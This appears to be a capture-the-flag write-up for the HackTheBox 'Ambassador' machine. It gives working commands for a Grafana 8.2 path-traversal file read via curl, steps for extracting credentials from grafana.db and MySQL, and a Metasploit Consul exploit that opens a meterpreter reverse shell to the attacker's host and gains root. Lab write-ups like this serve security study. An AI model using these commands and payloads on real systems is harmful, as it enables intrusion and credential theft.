## Ambassador | HackTheBox

You can access machine [here](https://app.hackthebox.com/machines/photobomb)

<img src="https://user-images.githubusercontent.com/67650329/208110807-3c7e022f-c6f3-4484-9f86-ec3460080c7f.png" width="300px" align="center">

---

### Scanning / Enumeration

`nmap -sC -sV -p- -T4 {IP}`

-sC = Run the default script.

-sV = Version of services.

-p- = Checking for all port.

-T4 = Scanning speed.

This is the result for the scanning with nmap tools:

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5+VCwR+2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa+KPePbz2n+2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ+XuQWsOrU5DJPrAlCmG12OMjsnP4OfI4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA+97wwNSZG2G/duS6lE8pYz1unL+Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8+SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB+qEq6SY6crjtfpYnd7+2DLwiYgcSiQxZMnY3ZkJiIf6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK+na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc=
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8+SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs=
|   256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
3306/tcp open  mysql   syn-ack ttl 63 MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 10
|   Capabilities flags: 65535
```

Port open:

- 22 = SSH.
- 80 = HTTP.
- 3000 = ppp?.
- 3306 = mysql.

what's inside port 3000. We can go into port 3000.

<img src="https://user-images.githubusercontent.com/67650329/208112246-f9b00562-9e60-4b0e-beaa-f11ede8a5465.png" width="500px" align="center">

We can see the version of Grafana thats its v.8.2

And we can search the vulnerability of [Exploit DB Granfana v.8.2](https://www.exploit-db.com/exploits/50581)

And we got another site explain the vulnerability [Another exploit Grafana v.8.2](https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/)

Download file on the exploit db. And run this code.

`python3 50581.py -H http://ambassador.htb:3000`

```
Read file > /etc/grafana/grafana.ini
# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = m***7

# used for signing
;secret_key = S***m
```
We got the user and password we can login into sql with this user use this [Another exploit Grafana v.8.2](https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/)

`curl --path-as-is http://[Target_IP]:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`

`curl --path-as-is http://[Target_IP]:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db`

`ls -l grafana.db`

`sqlite3 grafana.db`

Login the sqlite use the user before we got.

```SQL
sqlite> .table
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||d***!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-12-15 05:16:45|0|{}|1|uKewFgM4z
```
We got the credential user and password for login into mysql.

`mysql -h ambassador.htb -u grafana -p`

```SQL
MySQL [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
MySQL [whackywidget]> SHOW TABLES;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
MySQL [whackywidget]> SELECT * FROM users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | Y***=                                    |
+-----------+------------------------------------------+
```
And we got the developer user and hash password of developer user. We can decrypt the hash use [cyberchef](https://cyberchef.org/)

<img src="https://user-images.githubusercontent.com/67650329/208114975-a7be7846-744f-4939-b1c5-95c8a8900947.png" width="500px" align="center">

After we decrypt tha password we got the original password. We can use for ssh.

`ssh developer@10.10.11.183`

```
developer@ambassador:~$ whoami
developer
developer@ambassador:~$ pwd
/home/developer
developer@ambassador:~$ ls
asd  asdf  ex  exploit.py  snap  user.txt
developer@ambassador:~$ cat user.txt
f***2
```
We got the user and we can continue to the next level.

`cd /opt/my-app/`

`git show`
```SQL
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```
We got the token mysql. We can exploit use Metasploit.

`ssh -L 8500:0.0.0.0:8500 developer@10.10.11.183`

`sudo msfconsole -q -x "use multi/misc/consul_service_exec; set payload linux/x86/meterpreter/reverse_tcp;set rhosts 127.0.0.1; set lhost [tun0]; set acl_token bb03b43b-1d81-d62b-24b5-39540ee469b5; set lport 8801; exploit"`

```
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
rhosts => 127.0.0.1
lhost => 10.10.14.74
acl_token => bb03b43b-1d81-d62b-24b5-39540ee469b5
lport => 8801
[*] Started reverse TCP handler on 10.10.14.74:8801 
[*] Creating service 'jetHPARA'
[*] Service 'jetHPARA' successfully created.
[*] Waiting for service 'jetHPARA' script to trigger
[*] Sending stage (989032 bytes) to 10.10.11.183
[*] Meterpreter session 1 opened (10.10.14.74:8801 -> 10.10.11.183:45420) at 2022-12-15 06:08:12 -0500
[*] Removing service 'jetHPARA'
[*] Command Stager progress - 100.00% done (763/763 bytes)

meterpreter > getuid
Server username: root
meterpreter > cat /root/root.txt
e***8
```
Thank you for reading 👋.

---
